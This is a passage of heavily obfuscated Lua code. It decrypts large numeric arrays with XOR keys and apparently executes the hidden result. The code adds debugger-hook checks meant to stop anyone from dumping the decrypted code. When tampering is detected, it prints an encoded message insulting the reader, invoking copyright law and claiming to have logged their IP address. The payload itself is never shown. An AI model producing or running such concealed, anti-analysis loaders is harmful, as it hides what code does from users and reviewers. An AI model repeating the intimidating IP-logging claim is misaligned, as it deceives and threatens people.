  37, 57, 185, 33, 111, 56, 182, 138, 71, 74, 79, 7, 87, 119, 61, 22, 31, 63, 181, 10, 73, 86, 39, 57, 119, 35, 28, 59,
  16, 35, 71, 100, 113, 25, 77, 169, 26, 74, 94, 107, 25, 22, 7, 55, 9, 91, 79, 56, 81, 2, 100, 97, 81, 69, 88, 123, 86,
  78, 144, 71, 188, 28, 100, 130, 86, 110, 28, 27, 70, 152, 117, 113, 51, 92, 6, 38, 29, 121, 10, 112, 111, 112, 126, 35,
  173, 64, 103, 8, 21, 79, 25, 225, 44, 32, 81, 90, 100, 33, 72, 88, 123, 90, 35, 13, 27, 75, 117, 12, 227, 43, 104, 109,
  40, 6, 25, 45, 79, 9, 100, 110, 97, 63, 57, 185, 85, 26, 73, 9, 179, 74, 71, 90, 51, 15, 5, 184, 119, 109, 34, 102,
  124, 100, 86, 33, 14, 92, 18, 27, 2, 48, 70, 20, 76, 66, 15, 64, 88, 58, 0, 30, 40, 245, 123, 20, 98, 32, 218, 75, 97,
  254, 118, 48, 214, 121, 189, 185, 86, 25, 56, 44, 86, 0, 30, 60, 7, 126, 117, 24, 24, 14, 5, 20, 64, 191, 5, 99, 78,
  104, 61, 31, 183, 190, 48, 123, 23, 0, 8, 97, 10, 70, 20, 227, 121, 121, 55, 79, 63, 127, 22, 53, 90, 3, 25, 28, 91,
  71, 2, 47, 17, 78, 189, 75, 10, 119, 30, 104, 75, 58, 76, 91, 162, 10, 111, 13, 25, 61, 87, 104, 96, 90, 157, 75, 11,
  101, 65, 41, 60, 69, 109, 48, 57, 79, 119, 94, 80, 160, 65, 25, 59, 89, 60, 211, 72, 82, 117, 27, 73, 104, 38, 24, 89,
  112, 85, 33, 50, 94, 110, 124, 85, 66, 54, 109, 119, 60, 11, 47, 5, 100, 54, 32, 186, 21, 121, 63, 52, 9, 92, 30, 65,
  168, 34, 34, 111, 12, 68, 91, 75, 5, 79, 86, 3, 71, 111, 6, 121, 79, 93, 1, 110, 41, 119, 119, 70, 92, 69, 79, 24, 38,
  13, 45, 103, 69, 33, 127, 86, 10, 31, 19, 8, 48, 199, 56, 67, 76, 42, 61, 77, 7, 101, 72, 53, 73, 96, 109, 2, 77, 49,
  112, 24, 106, 97, 192, 71, 4, 80, 126, 86, 59, 36, 207, 42, 11, 81, 86, 41, 14, 97, 86, 119, 146, 54, 37, 202, 117,
  182, 58, 91, 77, 58, 28, 85, 58, 60, 31, 104, 233, 66, 110, 43, 79, 15, 22, 119, 23, 21, 74, 86, 24, 50, 89, 104, 43,
  109, 100, 159, 62, 75, 122, 117, 62, 110, 12, 6, 189, 97, 110, 119, 42, 35, 29, 32, 46, 151, 7, 10, 3, 34, 73, 83, 171,
  253, 28, 117, 11, 61, 143, 55, 42, 84, 41, 79, 27, 0, 65, 21, 20, 166, 3, 71, 119, 86, 115, 39, 45, 97, 121, 186, 217,
  72, 50, 109, 2, 1, 88, 20, 111, 72, 93, 106, 219, 19, 14, 2, 111, 27, 100, 77, 126, 4, 110, 64, 126, 185, 70, 103, 75,
  15, 124, 52, 89, 45, 100, 74, 164, 34, 61 }, "voWkiJMPNoUAjDv49YOYgfyk8O"); wWcDrNs6GEXfuscBZiCQPUnIg4JpBtvCuM42Toc9QuzE2Xi2a7YKARl =
eRxu1nRzQZDFoHNjA5quaTNfZsMMEFVVTZsFCiiVcWlB3mwgxoDwEQTHGnk; iilOuvmfMP5wfmMs6IDEVint3dtOzmG0I0HnN7LOrrS6I8lSNXt0UFEoi2yWA1k4DPKma =
eRxu1nRzQZDFoHNjA5quaTNfZsMMEFVVTZsFCiiVcWlB3mwgxoDwEQTHGnk; oXR21vGdAiWUWSYNSiosF3s0krrD3NrhSnqAAEWaNgstb8Rwj1nEBkAFldibqBlLaw8JV =
iilOuvmfMP5wfmMs6IDEVint3dtOzmG0I0HnN7LOrrS6I8lSNXt0UFEoi2yWA1k4DPKma; wPAi0MKwH3e5MsxHC33SNomtp7E9NUSIsSwd3WRkFHNrywztM81fFlPW =
oXR21vGdAiWUWSYNSiosF3s0krrD3NrhSnqAAEWaNgstb8Rwj1nEBkAFldibqBlLaw8JV; hX36CsfoZFjhMR20pLnAsBwmRwCP3wK9gQi7blNjWWXvBxroEtwnokmFjLoiT6 =
wPAi0MKwH3e5MsxHC33SNomtp7E9NUSIsSwd3WRkFHNrywztM81fFlPW; cmtCuJZ6t7Xx7rMfxuw9lI3JGjoyD5L66bPvOgtpMcw5rXMK7oXiNk1ovN2xpBboTlxso0Trk =
hX36CsfoZFjhMR20pLnAsBwmRwCP3wK9gQi7blNjWWXvBxroEtwnokmFjLoiT6; bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu = function(
  a)
  K, F = 1959457704822316, 16384 + 1254; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; uSY0iD1jEQ4XhBnP8Xs6UV1p8mBmUEVxcEbJRb4JBtlX5lPlGSXzaWsL7GDr = function(b)
  co = coroutine.create(b)
  gIAIoCdSXFB54kdXmGR4lbGrg46cPal42l86FmnOAP2ZVhR7En44bR5lV = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(gIAIoCdSXFB54kdXmGR4lbGrg46cPal42l86FmnOAP2ZVhR7En44bR5lV, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return gIAIoCdSXFB54kdXmGR4lbGrg46cPal42l86FmnOAP2ZVhR7En44bR5lV
end; nV6wlNfLBP7kieqpAxt8pBMBrpxBrISyxTLPrlCMBA8lMbV7T2ML = function(f, g)
  wHPmtUr1eIsPDUnepoILYxTtdisEBu1nyYnCYRTph2eh9OgMVJD9xBCh4I = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; hOgMbszPb0B8DIjGgEP91kfMkkQG0RqkHl7K9BRpBaV8rhPPaVFqTnBc2bdvsUcG8abscdB = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; tuOyxGhsuATDiscMGwwXML7swIiSSSCIqId8mA2RKAoNObtjMZ268SissTj = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      wHPmtUr1eIsPDUnepoILYxTtdisEBu1nyYnCYRTph2eh9OgMVJD9xBCh4I(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; qSJhPdv1wcJYjYuskx9E6LYVFepkKyzFWaVPqWfunxdHHxdI90cnGniPWQGVFTd3WmU0xE = function(p, n)
    cBJ4E3v7k6xSnLFc4GZtruk7bsteY8sHbb5wlrmhykcpMSCiu42sMUbft = ""
    for k, q in pairs(p) do cBJ4E3v7k6xSnLFc4GZtruk7bsteY8sHbb5wlrmhykcpMSCiu42sMUbft =
      cBJ4E3v7k6xSnLFc4GZtruk7bsteY8sHbb5wlrmhykcpMSCiu42sMUbft ..
      cmtCuJZ6t7Xx7rMfxuw9lI3JGjoyD5L66bPvOgtpMcw5rXMK7oXiNk1ovN2xpBboTlxso0Trk
      [bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('2C') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('7D') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('DB') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('02') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('97') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('60')]
      [bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('1C') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('B1') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('7A') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('DB')](
      q) end
    ; n(cBJ4E3v7k6xSnLFc4GZtruk7bsteY8sHbb5wlrmhykcpMSCiu42sMUbft)
  end; hOgMbszPb0B8DIjGgEP91kfMkkQG0RqkHl7K9BRpBaV8rhPPaVFqTnBc2bdvsUcG8abscdB(f,
    function(r) tuOyxGhsuATDiscMGwwXML7swIiSSSCIqId8mA2RKAoNObtjMZ268SissTj(r, g,
        function(s) qSJhPdv1wcJYjYuskx9E6LYVFepkKyzFWaVPqWfunxdHHxdI90cnGniPWQGVFTd3WmU0xE(s,
            function(t) if #uSY0iD1jEQ4XhBnP8Xs6UV1p8mBmUEVxcEbJRb4JBtlX5lPlGSXzaWsL7GDr(cmtCuJZ6t7Xx7rMfxuw9lI3JGjoyD5L66bPvOgtpMcw5rXMK7oXiNk1ovN2xpBboTlxso0Trk[bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('F5') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('E8') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('7A') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('6D')]) == 1 then if cmtCuJZ6t7Xx7rMfxuw9lI3JGjoyD5L66bPvOgtpMcw5rXMK7oXiNk1ovN2xpBboTlxso0Trk[bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('F5') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('E8') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('7A') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('6D')] == cmtCuJZ6t7Xx7rMfxuw9lI3JGjoyD5L66bPvOgtpMcw5rXMK7oXiNk1ovN2xpBboTlxso0Trk[bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('39') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('DB') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('02') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('97') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('7D')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if cmtCuJZ6t7Xx7rMfxuw9lI3JGjoyD5L66bPvOgtpMcw5rXMK7oXiNk1ovN2xpBboTlxso0Trk[bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('F5') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('E8') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('7A') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('6D')](t) then
                    cmtCuJZ6t7Xx7rMfxuw9lI3JGjoyD5L66bPvOgtpMcw5rXMK7oXiNk1ovN2xpBboTlxso0Trk
                        [bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('F5') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('E8') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('7A') .. bBo0gNvqKsdLHZeQNvXIQulaqkUfOFR84SdJ9ie3ZmrvVLWY3xuB83HQIqDLu('6D')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; nV6wlNfLBP7kieqpAxt8pBMBrpxBrISyxTLPrlCMBA8lMbV7T2ML(
{ 665, 796, 948, 750, 733, 1103, 837, 631, 985, 703, 1081, 594, 813, 551, 958, 879, 630, 738, 694, 587, 806, 743, 1056,
  1015, 920, 723, 898, 559, 1175, 1182, 589, 1138, 655, 1127, 811, 969, 848, 586, 1037, 984, 1095, 1160, 891, 963, 1198,
  548, 1071, 987, 562, 970, 1158, 815, 924, 986, 730, 679, 787, 1004, 712, 1007, 929, 903, 607, 1083, 902, 572, 1108,
  591, 706, 893, 808, 639, 584, 964, 1064, 795, 1133, 571, 954, 1192, 567, 604, 866, 892, 1165, 677, 1205, 574, 605, 664,
  820, 624, 634, 1026, 838, 632, 635, 772, 1112, 936, 595, 1033, 825, 833, 725, 1183, 1135, 565, 895, 988, 1114, 973,
  625, 1126, 980, 1006, 949, 1197, 638, 700, 1176, 1093, 789, 558, 968, 748, 569, 714, 777, 1203, 1186, 1202, 876, 1148,
  816, 819, 979, 676, 975, 938, 764, 997, 824, 1018, 836, 1043, 931, 1024, 1029, 662, 1079, 715, 643, 547, 881, 599,
  1065, 753, 644, 863, 778, 1092, 841, 1168, 994, 890, 598, 546, 826, 646, 1195, 793, 1028, 543, 991, 872, 1017, 741,
  939, 1170, 1027, 792, 556, 846, 786, 1098, 783, 1107, 727, 768, 602, 1184, 941, 1077, 545, 1151, 1085, 1020, 585, 767,
  1154, 972, 672, 622, 645, 1115, 735, 940, 1134, 693, 621, 1068, 1162, 959, 906, 1159, 851, 656, 849, 1058, 776, 981,
  708, 882, 996, 711, 739, 946, 771, 695, 839, 1091, 794, 749, 828, 967, 925, 983, 704, 568, 663, 1067, 989, 707, 557,
  710, 651, 802, 822, 908, 747, 799, 915, 570, 1110, 724, 901, 667, 593, 810, 883, 716, 1181, 1137, 998, 960, 858, 1025,
  698, 859, 701, 717, 671, 1042, 1044, 1163, 763, 657, 1032, 856, 926, 1030, 913, 731, 1174, 740, 609, 1012, 803, 600,
  993, 1155, 718, 1120, 1046, 791, 797, 957, 921, 668, 995, 1111, 612, 1193, 907, 765, 889, 1061, 1164, 790, 745, 1086,
  857, 1200, 955, 1190, 1094, 935, 1066, 1070, 1149, 754, 1045, 618, 928, 1062, 578, 613, 1088, 917, 952, 616, 961, 775,
  1156, 1047, 779, 1123, 683, 583, 800, 1082, 611, 1208, 722, 888, 930, 850, 675, 1116, 682, 1143, 919, 798, 1136, 874,
  1139, 696, 1050, 1001, 812, 1005, 579, 1166, 1074, 554, 1147, 588, 729, 827, 1185, 719, 756, 1144, 1141, 835, 971, 690,
  1150, 1084, 652, 780, 689, 580, 687, 633, 844, 650, 642, 597, 1041, 1142, 1128, 1210, 1201, 1145, 1106, 1002, 965, 658,
  1130, 821, 1187, 870, 1105, 1117, 782, 1188, 1177, 1173, 1053, 978, 620, 869, 809, 1206, 1129, 1097, 1022, 845, 1089,
  674, 766, 759, 1009, 860, 1211, 629, 553, 1204, 884, 564, 829, 702, 636, 590, 669, 855, 840, 726, 982, 561, 617, 804,
  755, 575, 1019, 1180, 868, 934, 673, 867, 899, 627, 1016, 831, 865, 1023, 1121, 862, 762, 1109, 680, 943, 852, 1153,
  1196, 922, 666, 977, 1021, 900, 773, 619, 573, 1057, 956, 1054, 785, 769, 1000, 805, 744, 1207, 861, 814, 1038, 549,
  1059, 685, 1171, 608, 654, 909, 563, 1034, 830, 603, 1178, 832, 1069, 720, 1052, 1199, 894, 582, 1078, 950, 1011, 1048,
  992, 843, 709, 1055, 916, 1179, 670, 953, 878, 1090, 577, 628, 659, 746, 734, 842, 713, 1076, 705, 566, 576, 1125, 999,
  601, 951, 933, 1100, 678, 552, 637, 610, 757, -1, 86, 48, 81, 77, 105, 30, 60, 130, 84, 71, 67, 38, 96, 67, 65, 17, 44,
  235, 16, 35, 68, 21, 60, 61, 78, 32, 41, 95, 23, 89, 99, 9, 41, 38, 68, 1, 19, 22, 85, 89, 99, 32, 106, 80, 11, 103,
  57, 11, 9, 212, 19, 9, 54, 229, 85, 80, 23, 51, 29, 64, 52, 122, 6, 239, 4, 110, 12, 43, 52, 40, 83, 179, 195, 22, 74,
  29, 113, 110, 24, 93, 111, 17, 16, 240, 17, 99, 89, 35, 1, 72, 21, 79, 109, 109, 83, 2, 82, 35, 21, 28, 120, 19, 96,
  29, 217, 6, 131, 110, 23, 102, 60, 80, 47, 83, 8, 31, 20, 238, 167, 77, 54, 21, 110, 76, 43, 17, 101, 41, 22, 119, 18,
  113, 13, 76, 30, 77, 57, 55, 4, 67, 2, 66, 90, 40, 35, 52, 109, 17, 140, 21, 100, 109, 28, 22, 249, 90, 193, 14, 6, 1,
  14, 41, 82, 102, 82, 82, 101, 17, 68, 32, 111, 32, 75, 42, 26, 97, 102, 76, 77, 99, 68, 31, 68, 42, 112, 222, 108, 20,
  58, 40, 42, 34, 66, 157, 16, 23, 29, 64, 73, 12, 28, 82, 2, 63, 105, 112, 120, 40, 18, 124, 118, 31, 20, 85, 30, 250,
  76, 90, 27, 57, 47, 10, 95, 99, 67, 84, 89, 160, 55, 17, 108, 227, 90, 12, 20, 107, 80, 68, 19, 50, 96, 168, 67, 13,
  62, 73, 101, 43, 84, 28, 75, 29, 98, 19, 67, 90, 75, 64, 152, 69, 11, 109, 17, 101, 181, 34, 80, 69, 85, 108, 49, 10,
  73, 108, 73, 18, 58, 15, 13, 2, 67, 67, 30, 68, 118, 16, 34, 81, 67, 91, 95, 175, 89, 19, 49, 97, 35, 35, 117, 53, 0,
  62, 122, 113, 104, 1, 67, 31, 8, 46, 135, 229, 25, 69, 72, 44, 9, 90, 35, 16, 118, 121, 90, 34, 84, 42, 103, 86, 211,
  26, 131, 68, 192, 91, 22, 122, 15, 116, 92, 90, 22, 17, 163, 117, 235, 24, 42, 93, 102, 62, 7, 67, 108, 182, 212, 13,
  0, 80, 63, 23, 20, 159, 242, 113, 57, 64, 16, 180, 29, 239, 41, 110, 43, 42, 68, 178, 82, 19, 79, 85, 240, 68, 68, 106,
  109, 6, 28, 29, 52, 137, 93, 2, 37, 22, 123, 90, 116, 3, 79, 200, 64, 36, 187, 83, 35, 81, 17, 17, 82, 109, 103, 20,
  64, 85, 15, 3, 96, 50, 101, 124, 7, 69, 1, 81, 55, 108, 25, 34, 67, 14, 9, 45, 3, 9, 106, 84, 111, 16, 59, 21, 8, 17,
  61, 54, 22, 55, 6, 252, 106, 39, 40, 89, 20, 102, 23, 98, 68, 67, 90, 76, 101, 48, 110, 26, 7, 235, 85, 187, 30, 51,
  55, 62, 32, 2, 98, 65, 56, 93, 29, 20, 22, 23, 1, 82, 87, 127, 101, 29, 247, 40, 110, 99, 77, 191, 105, 41, 172, 223,
  16, 67, 19, 23, 2, 91, 110, 21, 191, 101, 119, 85, 103, 90, 85, 57, 76, 29, 101, 211, 20, 67, 54, 107, 86, 111, 9, 125,
  99, 76, 98, 231, 145, 0, 186, 76, 94, 67, 98, 224, 23, 63, 89, 90, 74, 66, 11, 76, 108, 16, 60, 100, 89, 52, 82, 43,
  73, 125, 131, 97, 136, 80, 62, 206, 31, 45, 118, 27, 83, 41, 15, 53, 56, 49, 105, 115, 27, 2, 223, 76, 35, 157, 89,
  225, 45, 90, 64, 81, 11, 27, 164, 84, 80, 92, 93, 102, 61, 35, 109, 195, 67, 55, 17, 90, 56, 34, 20, 40, 29, 82, 2,
  124, 55, 124, 108, 108, 80, 80, 75, 90, 207, 127, 28, 100, 99, 95, 211, 75, 38, 127, 108, 71, 30, 94, 90, 102, 37, 40,
  30, 35, 90, 114, 36, 93, 100, 110, 89, 7, 194, 63, 78, 47, 7, 52, 85, 4, 88, 47, 90, 99, 108, 37, 58, 17, 16, 84, 90,
  37, 9, 40, 67, 222 }, "dC4ZLQCluzcyc1rzFdM6EzLNp0"); lNlpUDa6UVofWtTMs6qAFJs47oVlkwF42UbjPHsX5dmM2FKpUDWQwU8F7J =
cmtCuJZ6t7Xx7rMfxuw9lI3JGjoyD5L66bPvOgtpMcw5rXMK7oXiNk1ovN2xpBboTlxso0Trk; d7kObkidh8OhnwN4CXO0iqOuko98mBkRN2oU0fOICBySrMW3iVoRg06TTeKFPfItp2 =
cmtCuJZ6t7Xx7rMfxuw9lI3JGjoyD5L66bPvOgtpMcw5rXMK7oXiNk1ovN2xpBboTlxso0Trk; qZe6guexgeLYHgRF4Q8OhlbKYrq46nnUmVP5LSCvx4Yxgyxfyx3Eq8zUjOHatBYJNC4G4w6SFQ =
d7kObkidh8OhnwN4CXO0iqOuko98mBkRN2oU0fOICBySrMW3iVoRg06TTeKFPfItp2; ovp6DIvKpdfJYbCoePc2KMEQ5zJHUGCMlcXbwFnz80WiddrfwN6oJgl9zW =
qZe6guexgeLYHgRF4Q8OhlbKYrq46nnUmVP5LSCvx4Yxgyxfyx3Eq8zUjOHatBYJNC4G4w6SFQ; aHRsCePrHJwVej6PdNdAdZvBYNctmjhU4ob65oA30QAYmb8lPfEKzf3VV2aJ4Y4SaOSv16MEL0 =
ovp6DIvKpdfJYbCoePc2KMEQ5zJHUGCMlcXbwFnz80WiddrfwN6oJgl9zW; cKWvm1vHR2PYTAIzqIzQV7bIlLVWy29onOcAMa6xcDaE5aMuMVNX9VJW0bOsDrEsrS =
aHRsCePrHJwVej6PdNdAdZvBYNctmjhU4ob65oA30QAYmb8lPfEKzf3VV2aJ4Y4SaOSv16MEL0; l7cHsR4eEzvGmYpN2LrrqUCIYQeRSsIvWNNKoKNzwPF51W0uDDwZfCEMPv2QUaajUoRojt9Lg =
cKWvm1vHR2PYTAIzqIzQV7bIlLVWy29onOcAMa6xcDaE5aMuMVNX9VJW0bOsDrEsrS; uQHlTmzNVJfTsOFT4rh7fI6URLFJ1GE6opyOs9kLxJ0UT26Wf6lnZ1mW9clL5QOsQv3Xha =
l7cHsR4eEzvGmYpN2LrrqUCIYQeRSsIvWNNKoKNzwPF51W0uDDwZfCEMPv2QUaajUoRojt9Lg; gfcFohfiZ1LrP2kKBDOmCvbFw7hPOu8aFttRWPuEMrUNzJ6ZIRArADnC =
uQHlTmzNVJfTsOFT4rh7fI6URLFJ1GE6opyOs9kLxJ0UT26Wf6lnZ1mW9clL5QOsQv3Xha; vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk = function(
  a)
  K, F = 3737522435251177, 16384 + 8107; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; h2lNMGQ4HMohXuEDuVmY92D3SEtICR7rSq2XhNjkSyg0wbHR1dRN2 = function(b)
  co = coroutine.create(b)
  hLQxdFxxln7DVtyFiSqd9N55067L60bKpNDXXfYVSpTeGIe35k4wzJvrtV6sH69tbp1WpT7 = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(hLQxdFxxln7DVtyFiSqd9N55067L60bKpNDXXfYVSpTeGIe35k4wzJvrtV6sH69tbp1WpT7, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return hLQxdFxxln7DVtyFiSqd9N55067L60bKpNDXXfYVSpTeGIe35k4wzJvrtV6sH69tbp1WpT7
end; i4D6ovSjljJjN7O3eAcCnWqoe5yVLVlUyohiRXedHg1I3WbvxpBHHmOEn9hMgPAScIDGUuG = function(f, g)
  cR52YwhgRsPba57bGRVSpL6yg4PNr0snrWfYJl0rWarbyXpzm6IPJQ3nqEyAtAVlya = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; bEdmjJ2DIMfUsfU0x9t4KKWDVENtR550RDy3XgFDLucZI76QTcMi6wQi = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; k03rhjgknqyxMgVO0pqAJjrmHAmK7HAZOxCTiYjwchpXBXLvegTiW7loOKiXrIhJtZBWFOOT = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      cR52YwhgRsPba57bGRVSpL6yg4PNr0snrWfYJl0rWarbyXpzm6IPJQ3nqEyAtAVlya(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; e6qrO4U2nWAPwSgRbgM3EF6XZyJIcyeZ9nuwG6SFFARbOeJAgGy06iMqK = function(p, n)
    gDnSD64QR4lCHM1PTIMLdnxADu9cVx9nNrVOjHtEGkAKWIQJuu9oOQ07biHKt = ""
    for k, q in pairs(p) do gDnSD64QR4lCHM1PTIMLdnxADu9cVx9nNrVOjHtEGkAKWIQJuu9oOQ07biHKt =
      gDnSD64QR4lCHM1PTIMLdnxADu9cVx9nNrVOjHtEGkAKWIQJuu9oOQ07biHKt ..
      gfcFohfiZ1LrP2kKBDOmCvbFw7hPOu8aFttRWPuEMrUNzJ6ZIRArADnC
